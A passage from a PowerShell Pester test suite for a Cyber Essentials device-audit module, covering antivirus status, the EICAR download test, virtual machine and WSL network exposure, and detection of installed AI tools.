        Set-TestAntimalware -OS 'Windows 11' -DefenderMode 'Normal' -SecurityCenter @($defender) -Filters @{ bindflt = 409800 }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Status | Should -Be 'Pass'
        (& $script:bySubject $f 'Filter driver').Status | Should -Be 'Warn'
    }

    It 'Windows 11: a running antivirus missing from Security Center still counts, with a note' {
        Set-TestAntimalware -OS 'Windows 11' -DefenderMode 'Passive Mode' -SecurityCenter @() -Services @{ ContosoAV = 'Running' } -Filters @{ ContosoFlt = 323100 }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Actual | Should -Be 'Contoso AV running, but not registered with Windows Security Center'
        (& $script:bySubject $f 'Third-party protection').Status | Should -Be 'Manual'
    }
}

Describe 'Malware download test (MP-11, CE+ TC3)' {
    BeforeAll {
        InModuleScope CEAudit { $script:realMalwareTest = (Get-CEConfig).'malware-test' }
        function global:Set-TestMalwareAttestation {
            param($TestedOn, $Blocked, [string]$Product = 'Contoso AV')
            InModuleScope CEAudit -Parameters @{ On = $TestedOn; B = $Blocked; P = $Product } {
                param($On, $B, $P)
                $cfg = $script:realMalwareTest | ConvertTo-Json -Depth 5 | ConvertFrom-Json
                $cfg.attestation = [pscustomobject]@{ testedOn = $On; testedBy = 'IT'; product = $P; blocked = $B; browsers = 'Edge, Chrome' }
                (Get-CEConfig).'malware-test' = $cfg
            }
        }
        $script:mp11 = { @(Invoke-CEAuditCore -Id 'MP-11') }
    }
    BeforeEach {
        Set-TestDevice -Kind Secure
        InModuleScope CEAudit { (Get-CEConfig).'malware-test' = $script:realMalwareTest }
    }
    AfterAll {
        InModuleScope CEAudit { (Get-CEConfig).'malware-test' = $script:realMalwareTest }
    }

    It 'reads EICAR detections from Defender history, by name or by threat id, and ignores other threats' {
        InModuleScope CEAudit {
            Mock Get-MpThreat { @([pscustomobject]@{ ThreatID = 2147519003; ThreatName = 'Virus:DOS/EICAR_Test_File' }, [pscustomobject]@{ ThreatID = 227072; ThreatName = 'Trojan:Win32/Wacatac' }) }
            $script:detectionsFail = $false
            Mock Get-MpThreatDetection {
                if ($script:detectionsFail) { throw 'Access denied' }
                @([pscustomobject]@{ ThreatID = 2147519003; InitialDetectionTime = (Get-Date).AddDays(-2); ProcessName = 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'; ActionSuccess = $true; Resources = @('file:_C:\Users\paul\Downloads\eicar.com') },
                  [pscustomobject]@{ ThreatID = 227072; InitialDetectionTime = (Get-Date).AddDays(-1); ProcessName = 'C:\Windows\explorer.exe'; ActionSuccess = $true; Resources = @('file:_C:\x.exe') })
            }
            # Assign without @(): the function returns ,@() and @() would nest it.
            $d = Get-CEMalwareTestDetection
            $d.Count | Should -Be 1
            $d[0].ThreatName | Should -Be 'Virus:DOS/EICAR_Test_File'
            $d[0].Resources | Should -Be 'file:_C:\Users\paul\Downloads\eicar.com'

            Mock Get-MpThreat { @() }
            (Get-CEMalwareTestDetection).Count | Should -Be 1 -Because 'the EICAR threat id is recognised when the threat entry is gone'
            $script:detectionsFail = $true
            (Get-CEMalwareTestDetection).Count | Should -Be 0
        }
    }

    It 'passes when Defender recently blocked the test file, naming the browser' {
        Mock -ModuleName CEAudit Get-CEMalwareTestDetection {
            @([pscustomobject]@{ Time = (Get-Date).AddDays(-3); Process = 'C:\Program Files\Google\Chrome\Application\chrome.exe'; Resources = @('file:_C:\d\eicar.com'); ActionSuccess = $true; ThreatName = 'Virus:DOS/EICAR_Test_File' },
              [pscustomobject]@{ Time = (Get-Date).AddDays(-1); Process = 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'; Resources = @('file:_C:\d\eicar_com.zip'); ActionSuccess = $true; ThreatName = 'Virus:DOS/EICAR_Test_File' })
        }
        $f = @(& $script:mp11)
        $f[0].Status | Should -Be 'Pass'
        $f[0].Actual | Should -Match 'stopped the test file 2 time\(s\), most recently .* \(caught when used by msedge\.exe, chrome\.exe\)'
    }

    It 'fails when Defender detected the file but could not remove it' {
        Mock -ModuleName CEAudit Get-CEMalwareTestDetection { @([pscustomobject]@{ Time = (Get-Date).AddDays(-1); Process = 'msedge.exe'; Resources = @(); ActionSuccess = $false; ThreatName = 'EICAR' }) }
        (@(& $script:mp11))[0].Status | Should -Be 'Fail'
    }

    It 'ignores tests older than maxTestAgeDays and reports Info, which does not hold back the CE verdict' {
        Mock -ModuleName CEAudit Get-CEMalwareTestDetection { @([pscustomobject]@{ Time = (Get-Date).AddDays(-120); Process = 'msedge.exe'; Resources = @(); ActionSuccess = $true; ThreatName = 'EICAR' }) }
        $f = @(& $script:mp11)
        $f[0].Status | Should -Be 'Info'
        $f[0].Recommendation | Should -Match "Malware download test"
        $summary = InModuleScope CEAudit -Parameters @{ F = $f } { param($F) Get-CESummary -Findings $F }
        $summary.Verdict | Should -Match '^READY'
    }

    It 'uses a recorded test for other anti-malware: blocked passes, not blocked fails, old is Info' {
        Mock -ModuleName CEAudit Get-CEMalwareTestDetection { @() }
        Set-TestMalwareAttestation -TestedOn (Get-Date).AddDays(-10).ToString('yyyy-MM-dd') -Blocked $true
        $f = @(& $script:mp11)
        $f[0].Status | Should -Be 'Pass'
        $f[0].Actual | Should -Match 'by IT: Contoso AV blocked the test downloads'
        Set-TestMalwareAttestation -TestedOn (Get-Date).AddDays(-10).ToString('yyyy-MM-dd') -Blocked $false
        (@(& $script:mp11))[0].Status | Should -Be 'Fail'
        Set-TestMalwareAttestation -TestedOn (Get-Date).AddDays(-200).ToString('yyyy-MM-dd') -Blocked $true
        (@(& $script:mp11))[0].Actual | Should -Match 'older than 90 days'
        Set-TestMalwareAttestation -TestedOn $null -Blocked $null
        (@(& $script:mp11))[0].Actual | Should -Match 'No blocked test download'
    }

    It 'keeps the TC3 estimate at Check until the download test has passed' {
        InModuleScope CEAudit {
            $base = @{ Title = 't'; Subject = ''; Category = 'MalwareProtection'; Frameworks = @('CE v3.3', 'CE+ TC3'); Reference = ''; Severity = 'Info'; AutoFail = $false; Expected = ''; Actual = ''; Recommendation = ''; Evidence = @(); Remediation = $null }
            $finding = { param($id, $status, $fw) $h = $base.Clone(); $h.FindingId = $id; $h.CheckId = $id; $h.Status = $status; if ($fw) { $h.Frameworks = $fw }; [pscustomobject]$h }
            $mp01 = & $finding 'MP-01' 'Pass'
            $tc3 = { param($findings) ((Get-CESummary -Findings $findings).CEPlus | Where-Object TestCase -eq 'TC3').State }
            & $tc3 @($mp01) | Should -Be 'Check'
            & $tc3 @($mp01, (& $finding 'MP-11' 'Info' @('CE+ TC3'))) | Should -Be 'Check'
            & $tc3 @($mp01, (& $finding 'MP-11' 'Pass' @('CE+ TC3'))) | Should -Be 'Likely pass'
            & $tc3 @((& $finding 'MP-01' 'Fail'), (& $finding 'MP-11' 'Pass' @('CE+ TC3'))) | Should -Be 'Likely fail'
        }
    }

    It 'the HTML and Markdown reports link to the EICAR test files and show the last result' {
        $f = @(Invoke-CEAuditCore -Id 'MP-01', 'MP-11')
        $r = Export-CEReport -Findings $f -Context $global:CETestCtx -OutputPath (Join-Path $TestDrive 'mt')
        $html = Get-Content $r.Paths.Html -Raw
        $html | Should -Match '<h2 id="malware-test">Malware download test \(CE\+ TC3\)</h2>'
        foreach ($u in 'https://secure.eicar.org/eicar.com"', 'https://secure.eicar.org/eicar.com.txt"', 'https://secure.eicar.org/eicar_com.zip"') {
            $html | Should -Match ([regex]::Escape("<a href=`"$u target=`"_blank`" rel=`"noopener noreferrer`">"))
        }
        # Browsers display text files inline and ignore download= on other sites, so those links say Save link as.
        $html | Should -Match ([regex]::Escape('eicar.com.txt)</a> <span class="ref">right-click and choose <em>Save link as</em></span>'))
        $html | Should -Match ([regex]::Escape('eicar_com.zip)</a> <span class="ref">click to download</span>'))
        $html | Should -Match 'Expect an alert'
        $html | Should -Match 'Last result: <span class=''st st-Info''>&#8505; Info</span> No blocked test download'
        $html | Should -Not -Match 'X5O!P%@AP' -Because 'the report must never contain the test file itself'
        $md = Get-Content $r.Paths.Markdown -Raw
        $md | Should -Match ([regex]::Escape('- [EICAR test file (eicar.com)](https://secure.eicar.org/eicar.com) (right-click and choose Save link as)'))
        $md | Should -Match ([regex]::Escape('- [EICAR test file in a zip (eicar_com.zip)](https://secure.eicar.org/eicar_com.zip)' + "`r`n"))

        $r2 = Export-CEReport -Findings @(Invoke-CEAuditCore -Id 'MP-01') -Context $global:CETestCtx -OutputPath (Join-Path $TestDrive 'mt2')
        (Get-Content $r2.Paths.Html -Raw) | Should -Match 'MP-11 was not run'
    }

    It 'nothing in the repository contains the EICAR test string' {
        # Built from pieces so this test file itself doesn't contain it.
        $marker = 'X5O!P%@AP' + '[4\PZX54(P^)7CC)7}$' + 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE'
        $hits = @(Get-ChildItem -Path $script:RepoRoot -Recurse -File -ErrorAction SilentlyContinue |
            Where-Object { $_.FullName -notmatch '[\\/](\.git|node_modules|output|\.wrangler|\.data)[\\/]' } |
            Select-String -SimpleMatch -Pattern $marker -List -ErrorAction SilentlyContinue)
        @($hits | ForEach-Object { $_.Path }) | Should -BeNullOrEmpty
    }
}

Describe 'Virtual machines, WSL and containers (SC-12, FW-07)' {
    BeforeAll {
        function global:New-TestVirtState {
            param([object[]]$HyperV = @(), [object[]]$Nat = @(), [object[]]$VMware = @(), [object[]]$VirtualBox = @(), [object[]]$Wsl = @(),
                [string]$WslNetworking = '', [object[]]$Containers = @(), [object[]]$Listeners = @(), [string[]]$Notes = @(), [bool]$HyperVReadable = $true)
            [pscustomobject]@{ HyperV = [pscustomobject]@{ Readable = $HyperVReadable; Message = ''; Machines = $HyperV; NatMappings = $Nat }
                VMware = $VMware; VirtualBox = $VirtualBox; Wsl = $Wsl; WslNetworking = $WslNetworking; Containers = $Containers; Listeners = $Listeners; Notes = $Notes }
        }
        function global:Set-TestVirt {
            param($State)
            Set-TestDevice -Kind Secure
            $global:CETestVirt = $State
            Mock -ModuleName CEAudit Get-CEVirtualisationState { $global:CETestVirt }
        }
        $script:run = { param($id) @(Invoke-CEAuditCore -Id $id) }
        $script:sub = { param($f, $s) @($f | Where-Object { $_.Subject -eq $s }) }
    }

    Context 'parsers' {
        It 'reads VMware .vmx networking and shared folders, including the bridged default and VMnet0' {
            InModuleScope CEAudit {
                $vm = ConvertFrom-CEVmxText -Path 'C:\VMs\dev\dev.vmx' -Lines @(
                    '.encoding = "UTF-8"', 'displayName = "Dev box"',
                    'ethernet0.present = "TRUE"', 'ethernet0.connectionType = "nat"',
                    'ethernet1.present = "TRUE"',
                    'ethernet2.present = "TRUE"', 'ethernet2.connectionType = "custom"', 'ethernet2.vnet = "VMnet0"',
                    'ethernet3.present = "FALSE"', 'ethernet3.connectionType = "bridged"',
                    'isolation.tools.hgfs.disable = "FALSE"',
                    'sharedFolder0.present = "TRUE"', 'sharedFolder0.enabled = "TRUE"', 'sharedFolder0.hostPath = "C:\Users\paul\Documents"',
                    'sharedFolder1.present = "TRUE"', 'sharedFolder1.enabled = "FALSE"', 'sharedFolder1.hostPath = "D:\"')
                $vm.Name | Should -Be 'Dev box'
                $vm.Networks | Should -Be @('nat', 'bridged', 'bridged')
                $vm.SharedFolders | Should -Be @('C:\Users\paul\Documents')
                (ConvertFrom-CEVmxText -Path 'C:\VMs\x\x.vmx' -Lines @('isolation.tools.hgfs.disable = "TRUE"', 'sharedFolder0.present = "TRUE"', 'sharedFolder0.enabled = "TRUE"', 'sharedFolder0.hostPath = "C:\"')).SharedFolders.Count | Should -Be 0
                (ConvertFrom-CEVmxText -Path 'C:\VMs\x\x.vmx' -Lines @()).Name | Should -Be 'x'
            }
        }

        It 'reads VirtualBox .vbox bridged adapters, shared folders and NAT port forwards' {
            InModuleScope CEAudit {
                $xml = @'
<?xml version="1.0"?>
<VirtualBox xmlns="http://www.virtualbox.org/" version="1.19-windows">
  <Machine uuid="{1}" name="Kali" OSType="Debian_64">
    <Hardware>
      <Network>
        <Adapter slot="0" enabled="true" type="82540EM">
          <NAT>
            <Forwarding name="ssh" proto="1" hostport="2222" guestport="22"/>
            <Forwarding name="web" proto="1" hostip="127.0.0.1" hostport="8080" guestport="80"/>
            <Forwarding name="dns" proto="0" hostip="0.0.0.0" hostport="5353" guestport="53"/>
          </NAT>
        </Adapter>
        <Adapter slot="1" enabled="true"><BridgedInterface name="Intel(R) Ethernet"/></Adapter>
        <Adapter slot="2" enabled="false"><BridgedInterface name="Wi-Fi"/></Adapter>
      </Network>
      <SharedFolders><SharedFolder name="home" hostPath="C:\Users\paul" writable="true" autoMount="true"/></SharedFolders>
    </Hardware>
  </Machine>
</VirtualBox>
'@
                $vm = ConvertFrom-CEVboxXml -Xml $xml
                $vm.Name | Should -Be 'Kali'
                $vm.Bridged | Should -Be 1
                $vm.SharedFolders | Should -Be @('C:\Users\paul')
                @($vm.PortForwards | Where-Object Exposed | ForEach-Object { "$($_.Protocol)/$($_.HostPort)" }) | Should -Be @('tcp/2222', 'udp/5353')
            }
        }

        It 'cleans wsl.exe UTF-16 output and parses wsl.conf / .wslconfig' {
            InModuleScope CEAudit {
                $names = ConvertFrom-CEWslListOutput -Lines @("D`0e`0b`0i`0a`0n`0", '', "`0", "U`0b`0u`0n`0t`0u`0")
                $names | Should -Be @('Debian', 'Ubuntu')
                $ini = ConvertFrom-CEIniText -Lines @('[boot]', 'systemd=true', '', '# comment', '[automount]', ' enabled = false ', 'root = /mnt/  ; trailing', '[wsl2]', 'networkingMode="mirrored"')
                $ini['automount']['enabled'] | Should -Be 'false'
                $ini['automount']['root'] | Should -Be '/mnt/'
                $ini['wsl2']['networkingmode'] | Should -Be 'mirrored'
            }
        }
    }

    Context 'collection' {
        It 'finds VMware and VirtualBox machines from the user profile' {
            $profileDir = Join-Path $TestDrive 'profile'
            $vmDir = Join-Path $TestDrive 'vms'
            New-Item -ItemType Directory -Force -Path (Join-Path $profileDir 'AppData\Roaming\VMware'), (Join-Path $profileDir '.VirtualBox'), $vmDir | Out-Null
            $vmx = Join-Path $vmDir 'lab.vmx'
            Set-Content -LiteralPath $vmx -Value @('displayName = "Lab"', 'ethernet0.present = "TRUE"', 'ethernet0.connectionType = "bridged"')
            Set-Content -LiteralPath (Join-Path $profileDir 'AppData\Roaming\VMware\inventory.vmls') -Value @("vmlist1.config = `"$vmx`"", "vmlist2.config = `"$vmx`"", 'vmlist3.config = "C:\missing\gone.vmx"')
            $vbox = Join-Path $vmDir 'Win.vbox'
            Set-Content -LiteralPath $vbox -Value '<VirtualBox xmlns="http://www.virtualbox.org/"><Machine name="Win"><Hardware><Network><Adapter slot="0" enabled="true"><NAT/></Adapter></Network></Hardware></Machine></VirtualBox>'
            Set-Content -LiteralPath (Join-Path $profileDir '.VirtualBox\VirtualBox.xml') -Value "<VirtualBox xmlns=`"http://www.virtualbox.org/`"><Global><MachineRegistry><MachineEntry uuid=`"{1}`" src=`"$vbox`"/><MachineEntry uuid=`"{2}`" src=`"C:\missing\x.vbox`"/></MachineRegistry></Global></VirtualBox>"
            Set-Content -LiteralPath (Join-Path $profileDir '.wslconfig') -Value @('[wsl2]', 'networkingMode=bridged')
            InModuleScope CEAudit -Parameters @{ P = $profileDir } {
                param($P)
                $vmware = Get-CEVMwareMachine -ProfilePath $P
                $vmware.Count | Should -Be 1
                $vmware[0].Name | Should -Be 'Lab'
                $vbox = Get-CEVirtualBoxMachine -ProfilePath $P
                $vbox.Count | Should -Be 1
                $vbox[0].Name | Should -Be 'Win'
                Get-CEWslNetworkingMode -ProfilePath $P | Should -Be 'bridged'
                (Get-CEVMwareMachine -ProfilePath (Join-Path $P 'nobody')).Count | Should -Be 0
            }
        }

        It 'WSL: reads drive mounting only for running distributions, and never as SYSTEM' {
            InModuleScope CEAudit {
                Mock Get-CEWslRegistryEntry { @([pscustomobject]@{ Name = 'Debian'; Version = 2 }, [pscustomobject]@{ Name = 'Ubuntu'; Version = 2 }, [pscustomobject]@{ Name = 'Alpine'; Version = 2 }, [pscustomobject]@{ Name = 'docker-desktop'; Version = 2 }) }
                Mock Invoke-CENative { [pscustomobject]@{ ExitCode = 0; Output = @("D`0e`0b`0i`0a`0n`0", "A`0l`0p`0i`0n`0e`0", "d`0o`0c`0k`0e`0r`0-`0d`0e`0s`0k`0t`0o`0p`0") } }
                Mock Read-CEWslConf {
                    switch ($Name) {
                        'Debian' { [pscustomobject]@{ Reachable = $true; Exists = $true; Lines = @('[automount]', 'enabled=false') } }
                        'Alpine' { [pscustomobject]@{ Reachable = $true; Exists = $false; Lines = @() } }
                        default { [pscustomobject]@{ Reachable = $false; Exists = $false; Lines = @() } }
                    }
                }
                $d = Get-CEWslDistribution -Context ([pscustomobject]@{ IsSystem = $false })
                ($d | Where-Object Name -eq 'Debian').Automount | Should -BeFalse
                ($d | Where-Object Name -eq 'Alpine').Automount | Should -BeTrue
                ($d | Where-Object Name -eq 'Alpine').AutomountSource | Should -Match 'default applies'
                ($d | Where-Object Name -eq 'Ubuntu').Running | Should -BeFalse
                ($d | Where-Object Name -eq 'Ubuntu').Automount | Should -BeNullOrEmpty
                Should -Invoke Read-CEWslConf -Times 0 -ParameterFilter { $Name -eq 'Ubuntu' }
                ($d | Where-Object Name -eq 'docker-desktop').AutomountSource | Should -Match 'could not be read'

                $asSystem = Get-CEWslDistribution -Context ([pscustomobject]@{ IsSystem = $true })
                @($asSystem | Where-Object { $null -ne $_.Automount }).Count | Should -Be 0
                ($asSystem | Where-Object Name -eq 'Debian').AutomountSource | Should -Match 'SYSTEM'
                Should -Invoke Invoke-CENative -Times 1 -Exactly
            }
        }

        It 'Hyper-V: needs elevation, and reports VMs on external switches and NAT mappings' {
            InModuleScope CEAudit {
                Mock Get-Command { [pscustomobject]@{ Name = $Name } } -ParameterFilter { $Name -in 'Get-VM', 'Get-NetNatStaticMapping' }
                (Get-CEHyperVMachine -Context ([pscustomobject]@{ IsElevated = $false })).Readable | Should -BeFalse
                Mock Get-VMSwitch { @([pscustomobject]@{ Name = 'External LAN'; SwitchType = 'External' }, [pscustomobject]@{ Name = 'Default Switch'; SwitchType = 'Internal' }) }
                Mock Get-VM { @([pscustomobject]@{ Name = 'Server'; State = 'Running' }, [pscustomobject]@{ Name = 'Test'; State = 'Off' }) }
                Mock Get-VMNetworkAdapter { if ($VMName -eq 'Server') { [pscustomobject]@{ SwitchName = 'External LAN' } } else { [pscustomobject]@{ SwitchName = 'Default Switch' } } }
                Mock Get-NetNatStaticMapping { [pscustomobject]@{ Protocol = 'TCP'; ExternalIPAddress = '0.0.0.0'; ExternalPort = 3389; InternalIPAddress = '172.20.0.5'; InternalPort = 3389 } }
                $h = Get-CEHyperVMachine -Context ([pscustomobject]@{ IsElevated = $true })
                $h.Readable | Should -BeTrue
                ($h.Machines | Where-Object Name -eq 'Server').ExternalSwitches | Should -Be @('External LAN')
                @(($h.Machines | Where-Object Name -eq 'Test').ExternalSwitches).Count | Should -Be 0
                $h.NatMappings | Should -Be @('TCP 0.0.0.0:3389 -> 172.20.0.5:3389')
            }
        }

        It 'listening ports: only known publishing processes, flagged when not on loopback' {
            InModuleScope CEAudit {
                Mock Get-Command { [pscustomobject]@{ Name = 'Get-NetTCPConnection' } } -ParameterFilter { $Name -eq 'Get-NetTCPConnection' }
                Mock Get-NetTCPConnection {
                    @([pscustomobject]@{ LocalAddress = '0.0.0.0'; LocalPort = 8080; OwningProcess = 10 },
                      [pscustomobject]@{ LocalAddress = '127.0.0.1'; LocalPort = 5432; OwningProcess = 10 },
                      [pscustomobject]@{ LocalAddress = '::'; LocalPort = 445; OwningProcess = 4 },
                      [pscustomobject]@{ LocalAddress = '::1'; LocalPort = 2222; OwningProcess = 20 })
                }
                Mock Get-Process { switch ($Id) { 10 { [pscustomobject]@{ ProcessName = 'com.docker.backend' } } 20 { [pscustomobject]@{ ProcessName = 'wslrelay' } } default { [pscustomobject]@{ ProcessName = 'System' } } } }
                $l = Get-CEVirtualisationListener
                $l.Count | Should -Be 3
                @($l | Where-Object Exposed | ForEach-Object { "$($_.Product) $($_.Address):$($_.Port)" }) | Should -Be @('Docker Desktop 0.0.0.0:8080')
            }
        }
    }

    Context 'SC-12' {
        It 'passes when nothing is found, and is Info when parts could not be checked' {
            Set-TestVirt (New-TestVirtState)
            $f = @(& $script:run 'SC-12')
            $f.Count | Should -Be 1
            $f[0].Status | Should -Be 'Pass'
            Set-TestVirt (New-TestVirtState -Notes @('Hyper-V virtual machines need elevation to list'))
            $f = @(& $script:run 'SC-12')
            $f[0].Status | Should -Be 'Info'
            $f[0].Actual | Should -Match 'need elevation'
        }

        It 'lists everything found as in scope, and warns about shared folders and WSL drive mounting' {
            Set-TestVirt (New-TestVirtState `
                -HyperV @([pscustomobject]@{ Name = 'Server'; State = 'Running'; ExternalSwitches = @() }) `
                -VMware @([pscustomobject]@{ Name = 'Lab'; Networks = @('nat'); SharedFolders = @('C:\Users\paul') }) `
                -VirtualBox @([pscustomobject]@{ Name = 'Kali'; Bridged = 0; SharedFolders = @(); PortForwards = @() }) `
                -Wsl @([pscustomobject]@{ Name = 'Debian'; Version = 2; Running = $true; Automount = $true; AutomountSource = 'read from /etc/wsl.conf'; Tooling = $false },
                       [pscustomobject]@{ Name = 'Ubuntu'; Version = 2; Running = $false; Automount = $null; AutomountSource = 'not verified: the distribution is not running'; Tooling = $false },
                       [pscustomobject]@{ Name = 'Alpine'; Version = 1; Running = $true; Automount = $false; AutomountSource = 'read from /etc/wsl.conf'; Tooling = $false },
                       [pscustomobject]@{ Name = 'docker-desktop'; Version = 2; Running = $true; Automount = $true; AutomountSource = ''; Tooling = $true }) `
                -Containers @([pscustomobject]@{ Name = 'db'; Image = 'postgres:16'; Ports = '5432/tcp' }))
            $f = @(& $script:run 'SC-12')
            $main = & $script:sub $f ''
            $main.Status | Should -Be 'Manual'
            $main.Actual | Should -Match "^8 found: Hyper-V virtual machine 'Server' \(Running\); VMware virtual machine 'Lab'; VirtualBox virtual machine 'Kali'; WSL 2 distribution 'Debian' \(running\); WSL 2 distribution 'Ubuntu' \(stopped\); WSL 1 distribution 'Alpine' \(running\); Container platform \(docker-desktop\); Container 'db' \(postgres:16\)$" -Because 'count, then each item'
            (& $script:sub $f 'Shared folders').Actual | Should -Be "Host folders shared with virtual machines: VMware 'Lab': C:\Users\paul"
            $mount = & $script:sub $f 'WSL drive mounting'
            $mount.Status | Should -Be 'Warn'
            $mount.Actual | Should -Be 'Windows drives (C: at /mnt/c) are mounted in: Debian (read from /etc/wsl.conf); Ubuntu (on by default, not verified: the distribution is not running)'
            $mount.Recommendation | Should -Match 'enabled = false'
        }
    }

    Context 'FW-07' {
        It 'is not applicable with no virtualisation, and passes when nothing is exposed' {
            Set-TestVirt (New-TestVirtState)
            (& $script:run 'FW-07')[0].Status | Should -Be 'NotApplicable'
            Set-TestVirt (New-TestVirtState -Wsl @([pscustomobject]@{ Name = 'Debian'; Version = 2; Running = $true; Automount = $false; AutomountSource = ''; Tooling = $false }) `
                -Listeners @([pscustomobject]@{ Product = 'WSL'; Process = 'wslrelay'; Address = '127.0.0.1'; Port = 3000; Exposed = $false }) -WslNetworking 'nat')
            $f = @(& $script:run 'FW-07')
            $f[0].Status | Should -Be 'Pass'
            @($f[0].Evidence) | Should -Contain 'Listener: WSL (wslrelay) 127.0.0.1:3000'
        }

        It 'warns about bridged networking from every source' {
            Set-TestVirt (New-TestVirtState `
                -HyperV @([pscustomobject]@{ Name = 'Server'; State = 'Running'; ExternalSwitches = @('External LAN') }) `
                -VMware @([pscustomobject]@{ Name = 'Lab'; Networks = @('nat', 'bridged'); SharedFolders = @() }) `
                -VirtualBox @([pscustomobject]@{ Name = 'Kali'; Bridged = 1; SharedFolders = @(); PortForwards = @() }) `
                -Wsl @([pscustomobject]@{ Name = 'Debian'; Version = 2; Running = $true; Automount = $false; AutomountSource = ''; Tooling = $false }) -WslNetworking 'mirrored')
            $warn = & $script:sub (& $script:run 'FW-07') 'Bridged networking'
            $warn.Status | Should -Be 'Warn'
            $warn.Actual | Should -Be "Hyper-V 'Server' on external switch External LAN; VMware 'Lab' uses bridged networking; VirtualBox 'Kali' uses bridged networking; WSL uses mirrored networking (.wslconfig)"
        }

        It 'warns about ports published to the network, not ones bound to loopback' {
            Set-TestVirt (New-TestVirtState `
                -VirtualBox @([pscustomobject]@{ Name = 'Kali'; Bridged = 0; SharedFolders = @(); PortForwards = @(
                    [pscustomobject]@{ Name = 'ssh'; Protocol = 'tcp'; HostIp = ''; HostPort = '2222'; Exposed = $true },
                    [pscustomobject]@{ Name = 'web'; Protocol = 'tcp'; HostIp = '127.0.0.1'; HostPort = '8080'; Exposed = $false }) }) `
                -Nat @('TCP 0.0.0.0:3389 -> 172.20.0.5:3389', 'TCP 192.168.1.10:80 -> 172.20.0.6:80') `
                -Containers @([pscustomobject]@{ Name = 'web'; Image = 'nginx'; Ports = '0.0.0.0:8080->80/tcp, [::]:8080->80/tcp' }, [pscustomobject]@{ Name = 'db'; Image = 'postgres'; Ports = '127.0.0.1:5432->5432/tcp' }) `
                -Listeners @([pscustomobject]@{ Product = 'Docker Desktop'; Process = 'com.docker.backend'; Address = '0.0.0.0'; Port = 8080; Exposed = $true },
                             [pscustomobject]@{ Product = 'Docker Desktop'; Process = 'com.docker.backend'; Address = '127.0.0.1'; Port = 5432; Exposed = $false }))
            $f = @(& $script:run 'FW-07')
            @(& $script:sub $f 'Bridged networking').Count | Should -Be 0
            $warn = & $script:sub $f 'Published ports'
            $warn.Status | Should -Be 'Warn'
            $warn.Actual | Should -Be "Docker Desktop (com.docker.backend) listening on 0.0.0.0:8080; VirtualBox 'Kali' forwards tcp port 2222 on all interfaces; Hyper-V NAT mapping TCP 0.0.0.0:3389 -> 172.20.0.5:3389; Container 'web' publishes 0.0.0.0:8080->80/tcp, [::]:8080->80/tcp"
            $warn.Recommendation | Should -Match '127\.0\.0\.1'
        }
    }
}

Describe 'AI tools (UA-07, SC-09, UA-10)' {
    BeforeAll {
        function global:New-TestAITool {
            param([string]$Name, [string]$Service = 'Anthropic (Claude)', [bool]$CanAct = $true, [object[]]$Processes = @())
            [pscustomobject]@{ Id = ($Name.ToLower() -replace '[^a-z0-9]+', '-'); Name = $Name; Service = $Service; CanActOnDevice = $CanAct; Notes = ''
                Signals = @("Store app: $Name"); Processes = $Processes }
        }
        function global:New-TestAgentProcess {
            param([int]$ProcessId, [string]$Image = 'claude.exe', $Elevated = $false, [string]$Owner = 'PC\paul')
            [pscustomobject]@{ ProcessId = $ProcessId; Image = $Image; Path = "C:\x\$Image"; Owner = $Owner; AsSystem = ($Owner -eq 'NT AUTHORITY\SYSTEM'); Elevated = $Elevated }
        }
        function global:Set-TestAITools {
            param([object[]]$Tools = @(), [string[]]$Uninspected = @())
            Set-TestDevice -Kind Secure
            $global:CETestAI = [pscustomobject]@{ Tools = $Tools; UninspectedProcesses = $Uninspected }
            Mock -ModuleName CEAudit Get-CEAIToolState { $global:CETestAI }
        }
    }

    It 'the sandbox install catalogue is an overlay of the shipped tool list (same ids, no duplicated identity)' {
        # config/ai-tools.json is the one place a tool is defined. sandbox/tools.json only says how the lab
        # installs it. Ids must agree both ways so a rule cannot exist without a way to test it, and the
        # overlay must not restate identity that could drift from the rules.
        $rules = @((Get-Content (Join-Path $script:RepoRoot 'config\ai-tools.json') -Raw | ConvertFrom-Json).tools)
        $lab = @((Get-Content (Join-Path $script:RepoRoot 'sandbox\tools.json') -Raw | ConvertFrom-Json).tools)
        $isHelper = { param($t) [bool]($t.PSObject.Properties['helper'] -and $t.helper) }
        $labIds = @($lab | Where-Object { -not (& $isHelper $_) } | ForEach-Object id | Sort-Object)
        $ruleIds = @($rules | ForEach-Object id | Sort-Object)
        @($ruleIds | Where-Object { $labIds -notcontains $_ }) -join ', ' | Should -BeNullOrEmpty -Because 'every detection rule needs a lab entry (a recipe, or manual: true with a reason)'
        @($labIds | Where-Object { $ruleIds -notcontains $_ }) -join ', ' | Should -BeNullOrEmpty -Because 'the lab cannot install a tool the rules do not know'
        foreach ($t in $lab) {
            if (& $isHelper $t) { continue }
            $t.PSObject.Properties['name'] | Should -BeNullOrEmpty -Because "$($t.id): identity belongs in config/ai-tools.json"
            $manual = [bool]($t.PSObject.Properties['manual'] -and $t.manual)
            if ($manual) { [string]$t.reason | Should -Not -BeNullOrEmpty -Because "$($t.id) is manual and must say why" }
            else { [string]$t.install.type | Should -BeIn @('winget', 'script', 'npm', 'vscode') -Because $t.id }
        }
    }

    It 'the shipped tool list is well formed' {
        $list = Get-Content (Join-Path (Join-Path $script:RepoRoot 'config') 'ai-tools.json') -Raw | ConvertFrom-Json
        $list.lastReviewed | Should -Match '^\d{4}-\d{2}-\d{2}$'
        $ids = @($list.tools | ForEach-Object { $_.id })
        ($ids | Sort-Object -Unique).Count | Should -Be $ids.Count
        foreach ($t in @($list.tools)) {
            $signals = @($t.programs).Count + @($t.uninstallKeys).Count + @($t.appx).Count + @($t.processes).Count + @($t.paths).Count + @($t.vscodeExtensions).Count
            $signals | Should -BeGreaterThan 0 -Because $t.id
            foreach ($proc in @($t.processes)) { $proc.image | Should -Match '^[\w. -]+\.exe$' -Because $t.id }
            foreach ($prog in @($t.programs)) { ($prog.name -replace '[*?]', '').Length | Should -BeGreaterOrEqual 4 -Because "$($t.id) program pattern must not be too broad" }
            @($t.sources).Count | Should -BeGreaterThan 0 -Because $t.id
            foreach ($u in @($t.sources)) { $u | Should -Match '^https://' -Because $t.id }
        }
    }

    It 'detects tools from programs, Store apps, profile folders, extensions and processes' {
        $profileDir = Join-Path $TestDrive 'ai-profile'
